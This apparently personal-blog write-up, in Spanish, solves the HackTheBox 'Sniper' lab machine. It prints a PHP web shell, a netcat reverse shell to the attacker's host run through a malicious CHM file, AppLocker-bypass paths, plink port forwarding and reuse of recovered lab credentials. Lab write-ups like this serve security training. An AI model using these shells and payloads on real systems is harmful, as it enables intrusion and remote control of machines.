@@ -1,0 +1,228 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>Sniper HTB   WriteUP // 0xl3mon💀</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.80.0" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="0xl3mon" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://0xl3mon.github.io/css/main.min.4a7ec8660f9a44b08c4da97c5f2e31b1192df1d4d0322e65c0dbbc6ecb1b863f.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Sniper HTB   WriteUP"/>
+<meta name="twitter:description" content="Sniper - 10.129.1.171 Reconnaissance Nmap Recon Results Discovery OS System
+\
+Recon Open Ports
+Service Enumeration
+PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: Sniper Co. 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 6h59m59s | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2021-06-07T18:21:49 |_ start_date: N/A Analizando el resultado de nmap, vemos que tenemos solo 4 puertos abiertos , un servicio de samba y el otro el servidor http&hellip; lo que podemos deducir que probablemente esten conectados."/>
+
+    <meta property="og:title" content="Sniper HTB   WriteUP" />
+<meta property="og:description" content="Sniper - 10.129.1.171 Reconnaissance Nmap Recon Results Discovery OS System
+\
+Recon Open Ports
+Service Enumeration
+PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: Sniper Co. 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 6h59m59s | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2021-06-07T18:21:49 |_ start_date: N/A Analizando el resultado de nmap, vemos que tenemos solo 4 puertos abiertos , un servicio de samba y el otro el servidor http&hellip; lo que podemos deducir que probablemente esten conectados." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://0xl3mon.github.io/htb/sniper-htb-writeup/" />
+<meta property="article:published_time" content="2022-03-27T16:16:38+02:00" />
+<meta property="article:modified_time" content="2022-03-27T16:16:38+02:00" />
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://0xl3mon.github.io/"><img class="app-header-avatar" src="/avatar/panda-rose.jpg" alt="0xl3mon" /></a>
+      <h1>0xl3mon💀</h1>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/posts/">𝘏𝘰𝘮𝘦</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/htb/">𝘏𝘢𝘤𝘬𝘛𝘩𝘦𝘉𝘰𝘹</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/about/">𝘈𝘣𝘰𝘶𝘵</a>
+      </nav>
+      <p>ℂ𝕪𝕓𝕖𝕣𝕊𝕖𝕔𝕦𝕣𝕚𝕥𝕪 𝔹𝕝𝕠𝕘 </p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/0xl3mon" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+          <a href="https://www.linkedin.com/in/rodrigo-flores-36847a233/" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-linkedin">
+  <title>Linkedin</title>
+  <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">Sniper HTB   WriteUP</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Mar 27, 2022
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          6 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="sniper---101291171">Sniper - 10.129.1.171</h1>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap-recon-results">Nmap Recon Results</h3>
+<p><strong>Discovery OS System</strong></p>
+<p><img src="https://i.imgur.com/zoYkIQE.png" alt=""> \</p>
+<p><strong>Recon Open Ports</strong></p>
+<p><img src="https://i.imgur.com/Hb8SgZ8.png" alt=""></p>
+<p><strong>Service Enumeration</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">PORT    STATE SERVICE       VERSION
+80/tcp  open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Sniper Co.
+135/tcp open  msrpc         Microsoft Windows RPC
+139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds?
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 6h59m59s
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-06-07T18:21:49
+|_  start_date: N/A
+</code></pre></div><p>Analizando el resultado de nmap, vemos que tenemos solo 4 puertos abiertos ,  un servicio de samba y el otro el servidor http&hellip; lo que podemos deducir que probablemente esten conectados.</p>
+<h4 id="web-service-enumeration">Web Service Enumeration</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">http://10.129.95.80/
+</code></pre></div><p><img src="https://i.imgur.com/55DW7cD.png" alt="AltText|1000"></p>
+<p>Encontramos en el codigo fuente que la mayor parte de la pagina es estatica y  solamente 2 secciones parecen alojar mas contenido una es <strong>&ldquo;login.php&rdquo;</strong> y <strong>&quot;/blog/index.php&quot;</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">http://10.129.95.80/user/login.php
+</code></pre></div><p><img src="https://i.imgur.com/f7ifpKX.png" alt="AltText|600">
+encontramos un formulario de logueo en el cual tenemos una seccion para registrarnos, asi que procederemos a registrarnos</p>
+<p><img src="https://i.imgur.com/HSmbpcl.png" alt=""></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">- Usuario registrado
+	- test : test123
+</code></pre></div><p>una vez que nos logueamos vemos una pequeña animacion de que la web sigue en construccion&hellip; asi que no encontramos nada relevante, ahora seguiremos analizando la otra seccion del sitio web.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">http://10.129.95.80/blog/index.php
+</code></pre></div><p>analizando el sitio vemos que tiene una barra de navegacion con distintas pestañas y texto de relleno &ldquo;Lorem Ipsum&rdquo;</p>
+<p><img src="https://i.imgur.com/kZhzCmV.png" alt="">
+en el codigo fuente del sitio web nos damos cuenta que hace uso de el parametro &ldquo;lang&rdquo;, asi que intentaremos abusar de el mismo por si las entradas no estan
+sanitizadas y asi lograr un LFI.</p>
+<h3 id="exploit">Exploit</h3>
+<p><strong>Testing LFI</strong>
+<img src="https://i.imgur.com/omUEKTo.png" alt="">
+nuestra deduccion fue correcta, en efecto podemos conseguir un <strong>LFI</strong>, ahora intentaremos enumerar  otros ficheros interesantes</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">http://10.129.95.80/blog/?lang=/Windows/win.ini
+</code></pre></div><p><img src="https://i.imgur.com/6z3P5WD.png" alt=""></p>
+<h4 id="optional-ii">Optional II</h4>
+<p>Podriamos hacer uso de curl para enviar nuestra peticion get del LFI y solo filtrar por los campos que hay entre &ldquo;html y body&rdquo;</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">curl -s -G <span style="color:#e6db74">&#34;http://10.129.95.80/blog/?lang=/Windows/win.ini&#34;</span> | sed -n <span style="color:#e6db74">&#39;/&lt;\/html&gt;/,/&lt;\/body&gt;/p&#39;</span>
+</code></pre></div><p><img src="https://i.imgur.com/lKJ14VW.png" alt=""></p>
+<p><strong>Testing RFI</strong>
+<a href="http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html?m=1">Rfi To Shell Using Samba</a> -&gt; Nice Article
+nuestro proximo paso sera testear un RFI , para eso utilizaremos un servidor http o tcpdump (en el caso de samba) para ver si el servidor objetivo solicita el recurso que le especificamos en la peticion
+bien para esto primero verificaremos si recibimos alguna solicitud del servidor en nuestra maquina a traves del procotolo <strong>http</strong>, y si no es asi despues probaremos con <strong>smb</strong></p>
+<p><img src="https://i.imgur.com/Ah7MEFK.png" alt="AltText|1000">
+como se aprecia en la imagen anterior, no recibimos ninguna peticion. asi que continuaremos con samba</p>
+<p><img src="https://i.imgur.com/alq40nX.png" alt="AltText|1000">
+y por lo que vemos si, eso quiere decir que si se dan ciertos requitisos podriamos injectar comandos.  intentamos obtener el recurso a traves de <strong>smbserver</strong> pero no es posible ya que el servidor solicitaba el recurso pero no podia loguearse al mismo , asi que creamos un recurso compartido en la configuracion de samba &ldquo;/etc/samba/smb.conf&rdquo; e inicializamos el servicio de samba</p>
+<p><img src="https://i.imgur.com/dT6q7OP.png" alt="" title="Smb configuration">
+y lo intentamos de nuevo pero esta ves a traves de Burp</p>
+<p><img src="https://i.imgur.com/We1Ra4U.png" alt="">
+vemos que nuestro payload se ejecuta correctamente, asi que lo modificaremos y haremos una web shell.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;pre&gt;&#34;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">shell_exec</span>($_REQUEST[<span style="color:#e6db74">&#39;cmd&#39;</span>]) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;&lt;/pre&gt;&#34;</span> <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p><img src="https://i.imgur.com/CdgjdFe.png" alt=""></p>
+<h4 id="reverse-shell">Reverse Shell</h4>
+<p>compartiremos un binario a traves de sambaserver e intentaremos entablar una reverse shell para eso haremos uso del siguiente recurso <a href="https://github.com/WhiteWinterWolf/wwwolf-php-webshell">WhiteWinterWolf</a> que es una webshell en php que nos permite ejecutar comandos e inclusive subir ficheros.</p>
+<p><img src="https://i.imgur.com/xcH1M98.png" alt=""></p>
+<p>podemos subir ficheros por ejemplo a la ruta <code>C:\Windows\Temp</code> o mejor aun para bypassear el applocker podemos hacer uso del siguiente <a href="https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md">Recurso</a> en nuestro caso haremos uso de la ruta</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">C:\Windows\System32\spool\drivers\color
+</code></pre></div><p><strong>Option II</strong>
+intentamos ejecutar el binario de netcat a traves del recurso compartido de samba, pero no hemos obtenido la reverse shell, asi que copiaremos el fichero de netcat y lo pegaremos en <code>C:\Windows\System32\spool\PRINTERS</code> para despues ejecutar el binario desde ese directorio y puedamos bypassear el applock</p>
+<p><img src="https://i.imgur.com/ohppMhd.png" alt="">
+aparentemente el Antivirus nos borra el fichero asi que lo cambiaremos por</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">C:\Windows\System32\spool\drivers\color\nc.exe
+</code></pre></div><p>y ejecutamos nuestra reverse shell</p>
+<p><img src="https://i.imgur.com/7PIvOLR.png" alt="">
+enumerando el sistema nos damos cuenta que dentro del directorio del servicio web hay un fichero llamada <strong>&ldquo;db.php&rdquo;</strong>  con credenciales de logueo a la base de datos</p>
+<p><img src="https://i.imgur.com/im4erhz.png" alt="AltText|800"></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">- Credentials
+	- User : dbuser
+	-  Pass : 36mEAhz/B8xQ~2VM
+</code></pre></div><p>probablemente sean las credenciales del usuario Chris asi que verificaremos si son las credenciales correcta con crackmapexec</p>
+<p><img src="https://i.imgur.com/IRSX5B9.png" alt="">
+bien, listando los sockets en escucha del sistema nos damos cuenta que esta el puerto 5985 de winrm de forma interna, pero desde forma externa no nos aparece, seguramente por reglas de firewall,  asi que lo que haremos sera un remote port forwarding  del puerto de winrm <strong>&ldquo;5985&rdquo;</strong></p>
+<p><img src="https://i.imgur.com/tmRzBqk.png" alt=""></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">plink64.exe -l root -pw hola123 -R 5985:127.0.0.1:5985 10.10.14.68 -P <span style="color:#ae81ff">9999</span>
+</code></pre></div><p><img src="https://i.imgur.com/JPUW9Ey.png" alt="AltTExt|700">
+una vez que efectuamos el remote port forwarding haremos uso de la herramienta <strong>evil-winrm</strong> para validar si las credenciales que tenemos en efecto son del usuario &ldquo;Crhis&rdquo;</p>
+<p><strong>evil-winrm</strong></p>
+<p><img src="https://i.imgur.com/oqehzKZ.png" alt=""></p>
+<h3 id="option-iii">Option III</h3>
+<p><strong>Reuse Chris Credentials</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$password = ConvertTo-SecureString <span style="color:#e6db74">&#34;36mEAhz/B8xQ~2VM&#34;</span> -AsPlainText -Force
+$credential = new-object -typename System.Management.Automation.PSCredential -argumentlist <span style="color:#e6db74">&#34;Sniper\Chris&#34;</span>, $password
+Invoke-Command -ScriptBlock { whoami } -Credential $credential -Computer localhost
+
+</code></pre></div><p><img src="https://i.imgur.com/xH3CmPD.png" alt=""></p>
+<h2 id="priv-esc">Priv Esc</h2>
+<p><a href="https://www.pandasecurity.com/es-us/security-info/45119/information/Exploit.CHM">Vulnerability Information</a></p>
+<p>Encontramos un fichero llamado notes.txt en  <code>C:\Docs\notes.txt</code>  que dice lo siguiente.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">Hi Chris,
+Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of  bugs on it. And I hope that you<span style="color:#e6db74">&#39;ve prepared the documentation for our new app. Drop it here when you&#39;</span>re <span style="color:#66d9ef">done</span> with it.
+
+Regards,
+Sniper CEO.
+</code></pre></div><p>parece una madriguera de conejo ya que no nos dice nada util, asi que seguimos enumerando la maquina para encontrar un archivo particular en la ruta de</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">C:\User\Chris\Downloads\instructions.ch
+</code></pre></div><p>que al querer transferirnos a nuestra maquina obtenemos permisos denegados, asi que lo que hacemos es modificar el archivo de configuracion de samba con las siguientes intructiones</p>
+<p><img src="https://i.imgur.com/w1Xj1AV.png" alt=""></p>
+<p>y le asignamos permisos de escritura al directorio para que otros puedan escribir</p>
+<p><img src="https://i.imgur.com/MdVrwbd.png" alt=""></p>
+<p>ahora si nos copiamos el fichero</p>
+<p><img src="https://i.imgur.com/rbXYZMi.png" alt=""></p>
+<p>una vez que nos transferimos el fichero nos lo llevamos a una maquina local de windows ,  para examinarlo  vemos que es una estructura html simple,  bien ahora haremos uso del script <strong>out-chm</strong> De <strong>Nishang</strong> que nos permite generar un fichero <strong>.chm</strong> con el payload que le especifiquemos  para despues transferirlo a la maquina objetivo</p>
+<p><img src="https://i.imgur.com/CdBasKP.png" alt=""></p>
+<p>Ahora nos transferimos el fichero a la ubicacion</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">c:\docs\doc.chm
+</code></pre></div><p><img src="https://i.imgur.com/yCxSHhT.png" alt="AltText|900">
+como vemos recibimos el ping, pero el fichero despues se borra, asi que modificaremos el payload en nuestra maquina windows y lo volvemos a transferir a la maquina objetivo para que el proceso htmlhelp.exe lo ejecute.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">Import-Module .<span style="color:#ae81ff">\O</span>ut-CHM.ps1
+Out-CHM -Payload <span style="color:#e6db74">&#34;c:\windows\system32\spool\drivers\color\nc.exe 10.10.14.68 9999 -e powershell&#34;</span> -HHCPath  <span style="color:#e6db74">&#34;C:\Program Files (x86)\HTML Help Workshop&#34;</span>
+</code></pre></div><p><img src="https://i.imgur.com/7XRtByh.png" alt=""></p>
+<p><strong>Manual Method</strong>
+Para hacer el fichero &ldquo;.chm&rdquo; de forma manual temos el siguiente <a href="https://sevenlayers.com/index.php/316-malicious-chm">Recurso</a>.
+O inclusive <a href="https://gist.github.com/mgeeky/cce31c8602a144d8f2172a73d510e0e7">https://gist.github.com/mgeeky/cce31c8602a144d8f2172a73d510e0e7</a>.</p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
